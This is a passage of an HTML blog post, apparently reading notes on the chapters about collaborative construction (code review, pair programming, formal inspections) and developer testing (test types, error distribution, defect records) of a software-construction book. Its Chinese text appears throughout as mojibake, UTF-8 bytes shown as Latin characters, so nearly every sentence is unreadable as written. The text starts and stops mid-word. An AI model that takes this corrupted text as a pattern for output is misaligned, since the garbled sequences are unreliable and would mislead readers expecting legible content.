å¸Œæœ›è¾¾åˆ°çš„</strong>ï¼Œå¹¶å°±è¿™äº›ç›®æ ‡å’Œå›¢é˜Ÿæˆå‘˜è¿›è¡Œæ²Ÿé€šã€‚</li><li>æ²¡æœ‰ä»»ä½•ä¸€ç§é”™è¯¯æ£€æµ‹æ–¹æ³•èƒ½å¤Ÿè§£å†³å…¨éƒ¨é—®é¢˜ï¼Œæµ‹è¯•æœ¬èº«å¹¶ä¸æ˜¯æ’é™¤é”™è¯¯çš„æœ€æœ‰æ•ˆæ–¹æ³•ã€‚æˆåŠŸçš„è´¨é‡ä¿è¯è®¡åˆ’åº”è¯¥ä½¿ç”¨å¤šç§ä¸åŒçš„æŠ€æœ¯æ¥æ£€æŸ¥å„ç§ä¸åŒç±»å‹çš„é”™è¯¯ã€‚</li><li>åœ¨æ„å»ºæœŸé—´åº”å½“ä½¿ç”¨ä¸€äº›æœ‰æ•ˆçš„è´¨é‡ä¿è¯æŠ€æœ¯ï¼Œä½†åœ¨è¿™ä¹‹å‰ï¼Œä¸€äº›å…·æœ‰åŒæ ·å¼ºå¤§åŠŸèƒ½çš„è´¨é‡ä¿è¯æŠ€æœ¯ä¹Ÿæ˜¯å¿…ä¸å¯å°‘çš„ã€‚<strong>é”™è¯¯å‘ç°è¶Šæ—©ï¼Œå®ƒä¸å…¶ä½™ä»£ç çš„çº ç¼ å°±è¶Šå°‘ï¼Œç”±æ­¤é€ æˆçš„æŸå¤±ä¹Ÿè¶Šå°</strong>ã€‚</li><li>è½¯ä»¶é¢†åŸŸçš„è´¨é‡ä¿è¯æ˜¯é¢å‘è¿‡ç¨‹çš„ã€‚è½¯ä»¶å¼€å‘ä¸åˆ¶é€ ä¸šä¸ä¸€æ ·ï¼Œåœ¨è¿™é‡Œå¹¶ä¸å­˜åœ¨ä¼šå½±å“æœ€ç»ˆäº§å“çš„é‡å¤çš„é˜¶æ®µï¼Œå› æ­¤ï¼Œæœ€ç»ˆäº§å“çš„è´¨é‡å—åˆ°å¼€å‘è½¯ä»¶æ‰€ç”¨çš„è¿‡ç¨‹çš„æ§åˆ¶ã€‚</li></ul><h2 id="ç¬¬21ç« -ååŒæ„å»º"><a href="#ç¬¬21ç« -ååŒæ„å»º" class="headerlink" title="ç¬¬21ç«  ååŒæ„å»º"></a>ç¬¬21ç«  ååŒæ„å»º</h2><p>â€œååŒæ„å»ºâ€åŒ…æ‹¬ç»“å¯¹ç¼–ç¨‹ã€æ­£å¼æ£€æŸ¥ã€éæ­£å¼æŠ€æœ¯å¤æŸ¥ã€æ–‡æ¡£é˜…è¯»ï¼Œä»¥åŠè®©å…¶ä»–å¼€å‘äººå‘˜å…±åŒæ‰¿æ‹…åˆ›å»ºä»£ç åŠå…¶ä»–å·¥ä½œäº§å“è´£ä»»çš„æŠ€æœ¯ã€‚</p><p>ååŒæ„å»ºçš„é¦–è¦ç›®çš„å°±æ˜¯æ”¹å–„è½¯ä»¶çš„è´¨é‡ã€‚å¦ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå®ƒå¯ä»¥ç¼©çŸ­å¼€å‘å‘¨æœŸï¼Œä»è€Œå‡ä½å¼€å‘æˆæœ¬ã€‚</p><h3 id="ä»£ç -review-çš„ä¸€äº›ç ”ç©¶æ¡ˆä¾‹åŠæ”¶ç›Š"><a href="#ä»£ç -review-çš„ä¸€äº›ç ”ç©¶æ¡ˆä¾‹åŠæ”¶ç›Š" class="headerlink" title="ä»£ç  review çš„ä¸€äº›ç ”ç©¶æ¡ˆä¾‹åŠæ”¶ç›Š"></a>ä»£ç  review çš„ä¸€äº›ç ”ç©¶æ¡ˆä¾‹åŠæ”¶ç›Š</h3><ul><li>IBMå‘ç°ï¼Œä¸€å°æ—¶çš„ä»£ç æ£€æŸ¥èƒ½å¤ŸèŠ‚çœå¤§çº¦100å°æ—¶çš„ç›¸å…³å·¥ä½œ(æµ‹è¯•å’Œç¼ºé™·ä¿®æ­£)(Holland 1999)ã€‚</li><li>å¯¹ä¸€äº›å¤§å‹ç¨‹åºçš„ä¸€é¡¹ç ”ç©¶å‘ç°ï¼Œåœ¨æ­£å¼æ£€æŸ¥ä¸Šé¢èŠ±ä¸€ä¸ªå°æ—¶ï¼Œå¹³å‡å¯ä»¥é¿å…33ä¸ªå°æ—¶çš„ç»´æŠ¤å·¥ä½œ,å¹¶ä¸”æ£€æŸ¥çš„æ•ˆèƒ½æ˜¯æµ‹è¯•çš„20å€ä»¥ä¸Š(Russell1991)ã€‚</li><li>åŒä¸€ç»„äººå‘˜å¼€å‘äº†11ä¸ªç¨‹åºï¼Œå¹¶å°†å®ƒä»¬å‘å¸ƒåˆ°äº§å“å½“ä¸­ã€‚å…¶ä¸­çš„å‰5ä¸ªæ²¡æœ‰è¿›è¡Œå¤æŸ¥ï¼Œå…¶å¹³å‡æ¯ç™¾è¡Œä»£ç å­˜åœ¨4.5ä¸ªé”™è¯¯ã€‚å¦å¤–6ä¸ªç»è¿‡äº†ä»£ç æ£€æŸ¥ï¼Œå¹³å‡æ¯ç™¾è¡Œä»£ç åªæœ‰0.82 ä¸ªé”™è¯¯ã€‚å¤æŸ¥æ¶ˆç­äº†è¶…è¿‡80% çš„é”™è¯¯(Freedman and Weinberg 1990)ã€‚</li></ul><h3 id="ååŒæ„å»ºæœ‰åˆ©äºä¼ æˆå…¬å¸æ–‡åŒ–ä»¥åŠç¼–ç¨‹ä¸“ä¸šçŸ¥è¯†"><a href="#ååŒæ„å»ºæœ‰åˆ©äºä¼ æˆå…¬å¸æ–‡åŒ–ä»¥åŠç¼–ç¨‹ä¸“ä¸šçŸ¥è¯†" class="headerlink" title="ååŒæ„å»ºæœ‰åˆ©äºä¼ æˆå…¬å¸æ–‡åŒ–ä»¥åŠç¼–ç¨‹ä¸“ä¸šçŸ¥è¯†"></a>ååŒæ„å»ºæœ‰åˆ©äºä¼ æˆå…¬å¸æ–‡åŒ–ä»¥åŠç¼–ç¨‹ä¸“ä¸šçŸ¥è¯†</h3><p>è½¯ä»¶æ ‡å‡†å¯ä»¥å†™ä¸‹æ¥å¹¶å‘å¸ƒå‡ºå»ï¼Œä½†æ˜¯å¦‚æœæ— äººå»è®¨è®ºå®ƒä»¬ï¼Œä¹Ÿä¸é¼“åŠ±ä½¿ç”¨è¿™äº›æ ‡å‡†ï¼Œé‚£ä¹ˆå°±ä¸ä¼šæœ‰äººå»æŒ‰ç…§è¿™äº›æ ‡å‡†åšäº‹æƒ…ã€‚<strong>å¤æŸ¥æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„æœºåˆ¶ï¼Œå®ƒå¯ä»¥è®©ç¨‹åºå‘˜å¾—åˆ°å…³äºä»–ä»¬è‡ªå·±ä»£ç çš„åé¦ˆã€‚ä»£ç ã€æ ‡å‡†ä»¥åŠè®©ä»£ç ç¬¦åˆæ ‡å‡†çš„ç†ç”±ç­‰ï¼Œéƒ½æ˜¯å¤æŸ¥è®¨è®ºä¸­çš„å¥½ä¸»é¢˜ã€‚</strong></p><p>ç¨‹åºå‘˜é™¤äº†éœ€è¦å¾—åˆ°ä»–ä»¬æ˜¯å¦å¾ˆå¥½åœ°éµå¾ªäº†æ ‡å‡†çš„åé¦ˆä¹‹å¤–ï¼Œè¿˜éœ€è¦å¾—åˆ°ç¨‹åºè®¾è®¡ä¸»è§‚æ–¹é¢çš„å›é¦ˆï¼Œä¾‹å¦‚æ ¼å¼ã€æ³¨é‡Šã€å˜é‡åã€å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡çš„ä½¿ç”¨ã€è®¾è®¡æ–¹æ³•ä»¥åŠâ€œæˆ‘ä»¬è¿™é‡Œé‡‡ç”¨çš„è§£å†³æ–¹æ³•(the- way-we-do-things-around-here)â€ç­‰ã€‚åˆšå‡ºé“çš„ç¼–ç¨‹äººå‘˜éœ€è¦é‚£äº›æœ‰æ›´ä¸°å¯ŒçŸ¥è¯†çš„å‰è¾ˆç»™äºˆæŒ‡å¯¼ï¼Œè€Œèµ„æ·±ç¨‹åºå‘˜ä»¬å¾€å¾€å¤ªå¿™è€Œæ²¡æ—¶é—´åŒä»–äººåˆ†äº«ä»–ä»¬çš„çŸ¥è¯†ã€‚å¤æŸ¥ä¸ºè¿™ä¸¤ç§äººæä¾›äº†ä¸€ä¸ªæŠ€æœ¯äº¤æµçš„å¹³å°ï¼Œæ‰€ä»¥ï¼Œæ— è®ºåœ¨æœªæ¥è¿˜æ˜¯ç°åœ¨ï¼Œ<strong>å¤æŸ¥éƒ½æ˜¯åŸ¹å…»æ–°äººä»¥æé«˜å…¶ä»£ç è´¨é‡çš„å¥½æœºä¼š</strong>ã€‚</p><p>ä¸€ä¸ªé‡‡ç”¨æ­£å¼æ£€æŸ¥çš„å›¢é˜ŸæŠ¥å‘Šç§°ï¼Œ<strong>å¤æŸ¥å¯ä»¥å¿«é€Ÿåœ°å°†æ‰€æœ‰å¼€å‘è€…çš„æ°´å¹³æå‡åˆ°æœ€ä¼˜ç§€çš„å¼€å‘è€…çš„é«˜åº¦</strong>(Tackett and Van Doren 1999)ã€‚</p><h3 id="é›†ä½“æ‰€æœ‰æƒé€‚ç”¨äºæ‰€æœ‰å½¢å¼çš„ååŒæ„å»º"><a href="#é›†ä½“æ‰€æœ‰æƒé€‚ç”¨äºæ‰€æœ‰å½¢å¼çš„ååŒæ„å»º" class="headerlink" title="é›†ä½“æ‰€æœ‰æƒé€‚ç”¨äºæ‰€æœ‰å½¢å¼çš„ååŒæ„å»º"></a>é›†ä½“æ‰€æœ‰æƒé€‚ç”¨äºæ‰€æœ‰å½¢å¼çš„ååŒæ„å»º</h3><p>åœ¨é›†ä½“æ‰€æœ‰æƒä¸‹ï¼Œæ‰€æœ‰çš„ä»£ç éƒ½å±äºå›¢é˜Ÿè€Œä¸æ˜¯æŸä¸€ä¸ªäººï¼Œå¹¶ä¸”å›¢é˜Ÿä¸­çš„æ‰€æœ‰æˆå‘˜éƒ½å¯ä»¥å¯¹å…¶è¿›è¡Œè®¿é—®å’Œä¿®æ”¹ã€‚è¿™ä¼šå¸¦æ¥ä¸€äº›å¾ˆæœ‰ä»·å€¼çš„å¥½å¤„ã€‚</p><ul><li>ä¼—å¤šåŒçœ¼ç›çš„æ£€æŸ¥ï¼Œä»¥åŠä¼—å¤šç¨‹åºå‘˜çš„ååŠ›ç¼–å†™ï¼Œå¯ä»¥ä½¿ä»£ç çš„è´¨é‡å˜å¾—æ›´å¥½ã€‚</li><li>æŸä¸ªäººç¦»å¼€é¡¹ç›®æ‰€é€ æˆçš„å½±å“æ›´å°äº†ï¼Œå› ä¸ºæ¯æ®µä»£ç éƒ½æœ‰å¤šä¸ªäººç†Ÿæ‚‰å®ƒã€‚</li><li>æ€»ä½“ä¸Šç¼ºé™·ä¿®æ­£å‘¨æœŸå˜çŸ­äº†ï¼Œå› ä¸ºå‡ ä¸ªç¨‹åºå‘˜ä¸­çš„ä»»ä½•ä¸€ä¸ªæœ‰ç©ºï¼Œå°±èƒ½éšæ—¶è¢«æŒ‡æ´¾å»ä¿®æ­£ç¼ºé™·ã€‚</li></ul><blockquote><p>ååŒæ„å»ºçš„æ€æƒ³åŒæ ·é€‚ç”¨äºè¯„ä¼°ã€è®¡åˆ’ã€éœ€æ±‚ã€æ¶æ„ã€æµ‹è¯•ä»¥åŠç»´æŠ¤å·¥ä½œç­‰é˜¶æ®µã€‚</p></blockquote><h3 id="ç»“å¯¹ç¼–ç¨‹çš„å¥½å¤„"><a href="#ç»“å¯¹ç¼–ç¨‹çš„å¥½å¤„" class="headerlink" title="ç»“å¯¹ç¼–ç¨‹çš„å¥½å¤„"></a>ç»“å¯¹ç¼–ç¨‹çš„å¥½å¤„</h3><ul><li>ä¸å•ç‹¬å¼€å‘ç›¸æ¯”ï¼Œç»“å¯¹èƒ½å¤Ÿä½¿äººä»¬åœ¨å‹åŠ›ä¹‹ä¸‹ä¿æŒæ›´å¥½çš„çŠ¶æ€ã€‚ç»“å¯¹ç¼–ç¨‹é¼“åŠ±åŒæ–¹ä¿æŒä»£ç çš„é«˜è´¨é‡ï¼Œå³ä½¿åœ¨å‡ºç°äº†è®©äººä¸å¾—ä¸é£å¿«åœ°ç¼–å†™ä»£ç çš„å‹åŠ›æ—¶ä»ç„¶å¦‚æ­¤ã€‚</li><li>å®ƒèƒ½å¤Ÿæ”¹å–„ä»£ç è´¨é‡ã€‚ä»£ç çš„å¯è¯»æ€§å’Œå¯ç†è§£æ€§éƒ½å€¾å‘äºä¸Šå‡è‡³å›¢é˜Ÿä¸­æœ€ä¼˜ç§€ç¨‹åºå‘˜çš„æ°´å¹³ã€‚</li><li>å®ƒèƒ½ç¼©çŸ­è¿›åº¦æ—¶é—´è¡¨ã€‚ç»“å¯¹å¾€å¾€èƒ½å¤Ÿæ›´å¿«åœ°ç¼–å†™ä»£ç ï¼Œä»£ç çš„é”™è¯¯ä¹Ÿæ›´å°‘ã€‚è¿™æ ·ä¸€æ¥ï¼Œé¡¹ç›®ç»„åœ¨é¡¹ç›®åæœŸèŠ±è´¹åœ¨ä¿®æ­£ç¼ºé™·çš„æ—¶é—´ä¼šæ›´å°‘ã€‚</li><li>å®ƒè¿˜å…·æœ‰ååŒæ„å»ºçš„å…¶ä»–å¸¸è§å¥½å¤„ï¼ŒåŒ…æ‹¬ä¼ æ’­å…¬å¸æ–‡åŒ–ï¼ŒæŒ‡å¯¼åˆçº§ç¨‹åºå‘˜ï¼Œä»¥åŠåŸ¹å…»é›†ä½“å½’å±æ„Ÿã€‚</li></ul><p><strong>ä»»ä½•å¤„äºå¼€å‘é˜¶æ®µçš„ä»£ç è¯„å®¡å‡ä¸åº”ä½œä¸ºå‘˜å·¥çš„è¡¨ç°è¯„å®¡ï¼Œè€Œåº”è¯¥æ˜¯åŸºäºæœ€ç»ˆçš„äº§å“ã€‚å¦‚æœå¯¹å‘˜å·¥è¡¨ç°è¿›è¡Œæ’åï¼Œåˆ™åº”è¯¥è­¦å‘Šé‚£äº›å¤„äºæœ€ä½æ ‡å‡†ä»¥ä¸‹çš„å‘˜å·¥ï¼Œè€Œéæœ«ä½å‘˜å·¥ã€‚</strong></p><h3 id="æ­£å¼æ£€æŸ¥"><a href="#æ­£å¼æ£€æŸ¥" class="headerlink" title="æ­£å¼æ£€æŸ¥"></a>æ­£å¼æ£€æŸ¥</h3><p>è¿›è¡Œè¯¦æŸ¥çš„ç›®çš„æ˜¯å‘ç°è®¾è®¡æˆ–è€…ä»£ç ä¸­çš„ç¼ºé™·ï¼Œè€Œä¸æ˜¯æ¢ç´¢æ›¿ä»£æ–¹æ¡ˆï¼Œæˆ–è€…äº‰è®ºè°å¯¹è°é”™ï¼Œå…¶ç›®çš„ç»ä¸åº”è¯¥æ˜¯æ‰¹è¯„ä½œè€…çš„è®¾è®¡æˆ–è€…ä»£ç ã€‚å¯¹äºä½œè€…æ¥è¯´ï¼Œè¯¦æŸ¥çš„è¿‡ç¨‹åº”è¯¥æ˜¯æ­£é¢çš„ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­çš„å›¢é˜Ÿå‚ä¸ä½¿ç¨‹åºå¾—åˆ°äº†æ˜æ˜¾æ”¹å–„ï¼Œå¯¹æ‰€æœ‰å‚ä¸è€…éƒ½æ˜¯ä¸€ä¸ªå­¦ä¹ çš„è¿‡ç¨‹ã€‚è¿™ä¸€è¿‡ç¨‹ä¸åº”è¯¥è®©ä½œè€…è®¤ä¸ºå›¢é˜Ÿé‡Œé¢æŸäº›äººæ˜¯ç™½ç—´,æˆ–è€…è®¤ä¸ºè‡ªå·±åº”è¯¥å¦è°‹é«˜å°±ã€‚</p><p>æœ‰æ•ˆçš„è¯¦æŸ¥ï¼š</p><ul><li>ä½ æ˜¯å¦æœ‰ä¸€ä¸ªæ ¸å¯¹è¡¨ï¼Œèƒ½è®©è¯„è®ºå‘˜å°†æ³¨æ„åŠ›é›†ä¸­äºæ›¾ç»å‘ç”Ÿè¿‡é—®é¢˜çš„é¢†åŸŸ?</li><li>ä½ æ˜¯å¦ä¸“æ³¨äºæ‰¾å‡ºé”™è¯¯ï¼Œè€Œä¸æ˜¯ä¿®æ­£å®ƒä»¬?</li><li>ä½ æ˜¯å¦è€ƒè™‘åˆ¶å®šæŸäº›è§†è§’æˆ–è€…åœºæ™¯ï¼Œä»¥å¸®åŠ©è¯„è®ºå‘˜åœ¨å‡†å¤‡å·¥ä½œçš„æ—¶å€™é›†ä¸­æ³¨æ„åŠ›?</li><li>ä½ æ˜¯å¦ç»™äºˆè¯„è®ºå‘˜è¶³å¤Ÿçš„æ—¶é—´åœ¨è¯¦æŸ¥ä¼šè®®ä¹‹å‰è¿›è¡Œå‡†å¤‡ï¼Œæ˜¯å¦æ¯ä¸€ä¸ªäººéƒ½åšäº†å‡†å¤‡?</li><li>æ˜¯å¦æ¯ä¸€ä¸ªå‚ä¸è€…éƒ½æ‰®æ¼”ä¸€ä¸ªæ˜ç¡®çš„è§’è‰²â€”â€”ä¸»æŒäººã€è¯„è®ºå‘˜åŠè®°å½•å‘˜ç­‰?</li><li>ä¼šè®®æ˜¯å¦ä»¥æŸç§é«˜æ•ˆçš„é€Ÿåº¦è¿›è¡Œ?</li><li>ä¼šè®®æ˜¯å¦é™åˆ¶åœ¨ä¸¤ä¸ªå°æ—¶ä»¥å†…?</li><li>æ˜¯å¦æ‰€æœ‰è¯¦æŸ¥ä¼šè®®çš„å‚ä¸è€…éƒ½æ¥å—äº†å¦‚ä½•è¿›è¡Œè¯¦æŸ¥çš„é’ˆå¯¹æ€§åŸ¹è®­ï¼Œæ˜¯å¦ä¸»æŒäººæ¥å—äº†æœ‰å…³ä¸»æŒæŠ€å·§æ–¹é¢çš„é’ˆå¯¹æ€§åŸ¹è®­?</li><li>æ˜¯å¦å°†æ¯æ¬¡è¯¦æŸ¥æ‰€å‘ç°çš„é”™è¯¯æ•°æ®éƒ½æ”¶é›†èµ·æ¥ï¼Œä½¿ä½ èƒ½è°ƒæ•´æœ¬ç»„ç»‡ä»¥åä½¿ç”¨çš„æ ¸å¯¹è¡¨?</li><li>æ˜¯å¦æ”¶é›†äº†å‡†å¤‡é€Ÿåº¦å’Œè¯¦æŸ¥é€Ÿåº¦æ–¹é¢çš„æ•°æ®ï¼Œä»¥ä¾¿ä½ å»ä¼˜åŒ–ä»¥åçš„å‡†å¤‡å’Œè¯¦æŸ¥å·¥ä½œ?</li><li>æ˜¯å¦æ¯æ¬¡è¯¦æŸ¥ä¸­è¢«æŒ‡æ´¾ä¸‹å»çš„æ´»åŠ¨éƒ½è¢«æ­£ç¡®è·Ÿè¿›äº†ï¼Œæ— è®ºæ˜¯é€šè¿‡ä¸»æŒäººè‡ªå·±è¿˜æ˜¯ä¸€æ¬¡é‡æ–°è¯¦æŸ¥?</li><li>ç®¡ç†å±‚æ˜¯å¦ç†è§£ä»–ä»¬ä¸åº”è¯¥å‚ä¸è¯¦æŸ¥ä¼šè®®?</li><li>æ˜¯å¦æœ‰ä¸€ä¸ªç”¨äºä¿è¯ä¿®æ­£æ­£ç¡®æ€§çš„è·Ÿè¿›è®¡åˆ’?</li></ul><p>NASA çš„ä¸€é¡¹ç ”ç©¶è¡¨æ˜ï¼Œé€šè¿‡é˜…è¯»ä»£ç ï¼Œæ¯å°æ—¶èƒ½å‘ç° 3.3 ä¸ª bugï¼Œè€Œæµ‹è¯•åªèƒ½å‘ç° 1.8 ä¸ªï¼Œåœ¨æ•´ä¸ªé¡¹ç›®ç‚¹ç”Ÿå‘½å‘¨æœŸä¸­ï¼Œä»£ç  review èƒ½æ¯”å„ç§æµ‹è¯•æ–¹æ³•å¤šå‘ç°20%~60%çš„é”™è¯¯ã€‚</p><p>ä»£ç  review ç›¸æ¯”äºä¼šè®®å½¢å¼çš„ä»£ç è¯„å®¡è€Œè¨€ï¼Œèƒ½è®©è¯„å®¡è€…æ›´ä¸“æ³¨äºä»£ç çš„ç‹¬ç«‹å¤æŸ¥ï¼Œè€Œéä¼šè®®æœ¬èº«ã€‚<strong>åœ¨ä¼šè®®ä¸­ï¼Œæ¯ä¸ªäººåªåœ¨ä¸€éƒ¨åˆ†æ—¶é—´åšè´¡çŒ®ã€‚</strong></p><h2 id="ç¬¬22ç« -å¼€å‘è€…æµ‹è¯•"><a href="#ç¬¬22ç« -å¼€å‘è€…æµ‹è¯•" class="headerlink" title="ç¬¬22ç«  å¼€å‘è€…æµ‹è¯•"></a>ç¬¬22ç«  å¼€å‘è€…æµ‹è¯•</h2><h3 id="æµ‹è¯•åŒ…æ‹¬"><a href="#æµ‹è¯•åŒ…æ‹¬" class="headerlink" title="æµ‹è¯•åŒ…æ‹¬"></a>æµ‹è¯•åŒ…æ‹¬</h3><ul><li>å•å…ƒæµ‹è¯•</li><li>ç»„ä»¶æµ‹è¯•</li><li>é›†æˆæµ‹è¯•</li><li>å›å½’æµ‹è¯•</li><li>ç³»ç»Ÿæµ‹è¯•</li></ul><p>å¾ˆå¤šé¡¹ç›®å°†æµ‹è¯•ä½œä¸ºè½¯ä»¶è´¨é‡çš„å”¯ä¸€ç»„æˆéƒ¨åˆ†ï¼Œè¿™æ˜¯éå¸¸é”™è¯¯çš„åšæ³•ï¼Œå› ä¸ºå„ç§å½¢å¼çš„ååŒå¼€å‘æ—¶é—´éƒ½è¡¨ç°å‡ºæ¯”æµ‹è¯•æ›´é«˜çš„é”™è¯¯æ£€æµ‹ç‡ï¼Œè€Œä¸”å‘ç°ä¸€æ¡é”™è¯¯çš„æˆæœ¬ä¸åˆ°æµ‹è¯•çš„äºŒåˆ†ä¹‹ä¸€ã€‚</p><p>ä½ å¿…é¡»æœŸæœ›åœ¨ä½ çš„ä»£ç é‡Œæœ‰é”™è¯¯ã€‚å°½ç®¡è¿™ç§æœŸæœ›ä¼¼ä¹æœ‰æ‚–å¸¸ç†ï¼Œä½†æ˜¯ä½ åº”è¯¥æœŸæœ›æ‰¾åˆ°è¿™ä¸ªé”™è¯¯çš„äººæ˜¯ä½ ï¼Œè€Œä¸æ˜¯åˆ«äººã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872vsqju0j31080j040x.jpg" alt=""></p><blockquote><p>å¦‚ä½•å¼€å‘å‡ºé«˜è´¨é‡çš„ç¨‹åºï¼Ÿ</p></blockquote><ol><li>å¯¹å¼€å‘çš„åŠŸèƒ½æ­å»ºåŸå‹æ¡†æ¶ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ç¼ºé™·</li><li>é‡‡ç”¨å•å…ƒæµ‹è¯•</li><li><strong>å¼€å‘å®Œæˆè‡ªæˆ‘ review ä»£ç </strong>ï¼Œè¿™é€šå¸¸èƒ½å‘ç°å¾ˆå¤šé—®é¢˜ï¼Œé¿å…è¿™äº›é—®é¢˜åœ¨æµ‹è¯•ä¸­æµªè´¹æ—¶é—´ã€‚</li><li>å¯¹å¼€å‘çš„åŠŸèƒ½æµ‹è¯•</li><li>å¯»æ±‚æ›´æœ‰ç»éªŒçš„äºº review</li><li>æäº¤æµ‹è¯•</li></ol><p>å‡å¦‚ä½ æ­£åœ¨å†™å‡ ä¸ªå­ç¨‹åºï¼Œé‚£ä¹ˆä½ åº”è¯¥ä¸€ä¸ªä¸€ä¸ªåœ°å¯¹å®ƒä»¬è¿›è¡Œæµ‹è¯•ã€‚ç‹¬ç«‹è¿›è¡Œå­ç¨‹åºçš„æµ‹è¯•ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹æƒ…ï¼Œä½†æ˜¯å•ç‹¬è°ƒè¯•å®ƒä»¬ï¼Œæ¯”é›†æˆä¹‹åå†è¿›è¡Œæµ‹è¯•è¦ç®€å•å¾—å¤šã€‚å¦‚æœå°†å‡ ä¸ªæ²¡æœ‰ç»è¿‡æµ‹è¯•çš„å­ç¨‹åºæ”¾åˆ°ä¸€èµ·ï¼Œç»“æœå‘ç°äº†ä¸€ä¸ªé”™è¯¯ï¼Œé‚£ä¹ˆè¿™å‡ ä¸ªå­ç¨‹åºéƒ½æœ‰å«Œç–‘ã€‚å‡å¦‚æ¯æ¬¡åªå°†ä¸€ä¸ªå­ç¨‹åºåŠ å…¥åˆ°æ­¤å‰ç»è¿‡æµ‹è¯•çš„å­ç¨‹åºé›†åˆä¸­ï¼Œé‚£ä¹ˆä¸€æ—¦å‘ç°äº†æ–°çš„é”™è¯¯ï¼Œä½ å°±ä¼šçŸ¥é“è¿™æ˜¯æ–°å­ç¨‹åºæˆ–è€…å…¶æ¥å£æ‰€å¼•å‘çš„é—®é¢˜ï¼Œè°ƒè¯•å·¥ä½œå°±è½»æ¾å¤šäº†ã€‚</p><p>å®Œå…¨æµ‹è¯•ï¼ˆæµ‹è¯•ç¨‹åºæ¯ä¸€ç§å¯èƒ½çš„è¾“å…¥å€¼ï¼‰æ˜¯ä¸å¯èƒ½ï¼Œä¹Ÿæ²¡å¿…è¦çš„ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©é‚£äº›æœ€æœ‰å¯èƒ½æ‰¾åˆ°é”™è¯¯çš„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>å‡ ç§è¾ƒå¥½çš„æµ‹è¯•æ•°æ®ç±»å‹ï¼š</p><ul><li>æ­£å¸¸æƒ…å†µä¸‹çš„æ•°æ®</li><li>æ­£å¸¸æƒ…å†µçš„æœ€å°å€¼</li><li>æ­£å¸¸æƒ…å†µçš„æœ€å¤§å€¼</li><li>ä¸æ—§æ•°æ®çš„å…¼å®¹æ€§</li></ul><p>ç»å¤§å¤šæ•°é”™è¯¯å¾€å¾€ä¸å°‘æ•°å‡ ä¸ªå…·æœ‰ä¸¥é‡ç¼ºé™·çš„å­ç¨‹åºæœ‰å…³ã€‚<strong>80%çš„é”™è¯¯å­˜åœ¨äº20%çš„ç±»æˆ–å­ç¨‹åºå½“ä¸­ã€‚</strong></p><p><strong>é”™è¯¯å¹¶éå¹³å‡åˆ†å¸ƒåœ¨æ‰€æœ‰çš„å­ç¨‹åºé‡Œï¼Œè€Œæ˜¯é›†ä¸­åœ¨å°‘æ•°å‡ ä¸ªå­ç¨‹åºä¸­ã€‚</strong></p><p>è½¯ä»¶è´¨é‡çš„æ™®éåŸåˆ™ï¼š<strong>æé«˜è´¨é‡å°±èƒ½ç¼©çŸ­å¼€å‘å‘¨æœŸï¼ŒåŒæ—¶é™ä½å¼€å‘æˆæœ¬ã€‚</strong></p><h3 id="é”™è¯¯çš„åˆ†ç±»å¯ç¤º"><a href="#é”™è¯¯çš„åˆ†ç±»å¯ç¤º" class="headerlink" title="é”™è¯¯çš„åˆ†ç±»å¯ç¤º"></a>é”™è¯¯çš„åˆ†ç±»å¯ç¤º</h3><ul><li>å¤§å¤šæ•°é”™è¯¯çš„å½±å“èŒƒå›´æ˜¯ç›¸å½“æœ‰é™çš„</li><li>è®¸å¤šé”™è¯¯å‘ç”Ÿåœ¨æ„å»ºä¹‹å¤–ã€‚å¦‚ï¼šç¼ºä¹åº”ç”¨é¢†åŸŸçŸ¥è¯†ã€é¢‘ç¹å˜åŠ¨ä¸”ç›¸äº’çŸ›ç›¾çš„éœ€æ±‚ï¼Œä»¥åŠæ²Ÿé€šå’Œåè°ƒçš„å¤±è´¥ã€‚</li><li>å¤§å¤šæ•°çš„æ„å»ºæœŸé”™è¯¯æ˜¯æœ‰å¼€å‘è€…é€ æˆçš„</li><li>æ‹¼å†™é”™è¯¯æ˜¯ä¸€ä¸ªå¸¸è§çš„é—®é¢˜æ ¹æº</li><li>å¼€å‘è€…é”™è¯¯ç†è§£è®¾è®¡ç»å¸¸å‘ç”Ÿ</li><li>å¤§å¤šæ•°é”™è¯¯éƒ½å¾ˆå®¹æ˜“ä¿®æ­£ã€‚å¤§çº¦85%çš„é”™è¯¯å¯ä»¥åœ¨å‡ å°æ—¶å†…ä¿®æ­£ï¼Œ15%çš„é”™è¯¯åœ¨å‡ å°æ—¶åˆ°å‡ å¤©å†…å¯ä»¥ä¿®æ­£ï¼Œåªæœ‰å¤§çº¦1%çš„é”™è¯¯éœ€è¦èŠ±æ›´é•¿çš„æ—¶é—´ä¿®å¤ã€‚</li><li>æ€»ç»“æ‰€åœ¨ç»„ç»‡ä¸­å¯¹ä»˜é”™è¯¯çš„ç»éªŒ</li></ul><h3 id="æµ‹è¯•è®°å½•åº”è¯¥åŒ…æ‹¬"><a href="#æµ‹è¯•è®°å½•åº”è¯¥åŒ…æ‹¬" class="headerlink" title="æµ‹è¯•è®°å½•åº”è¯¥åŒ…æ‹¬"></a>æµ‹è¯•è®°å½•åº”è¯¥åŒ…æ‹¬</h3><ul><li>ç¼ºé™·çš„ç®¡ç†æ–¹é¢æè¿°(æŠ¥å‘Šæ—¥æœŸã€æŠ¥å‘Šäººã€æè¿°æˆ–æ ‡é¢˜ã€ç”Ÿæˆç¼–å·ä»¥åŠä¿®æ­£é”™è¯¯çš„æ—¥æœŸç­‰)</li><li>é—®é¢˜çš„å®Œæ•´æè¿°</li><li>å¤ç°é”™è¯¯æ‰€éœ€è¦çš„æ­¥éª¤</li><li>ç»•è¿‡è¯¥é—®é¢˜çš„å»ºè®®</li><li>ç›¸å…³çš„ç¼ºé™·</li><li>é—®é¢˜çš„ä¸¥é‡ç¨‹åº¦â€”â€”ä¾‹å¦‚è‡´å‘½çš„ã€ä¸¥é‡çš„æˆ–è€…è¡¨é¢çš„</li><li>ç¼ºé™·æ ¹æº:éœ€æ±‚ã€è®¾è®¡ã€ç¼–ç è¿˜æ˜¯æµ‹è¯•</li><li>å¯¹ç¼–ç ç¼ºé™·çš„åˆ†ç±»: off-by-one é”™è¯¯ã€é”™è¯¯èµ‹å€¼ã€é”™è¯¯æ•°ç»„ä¸‹æ 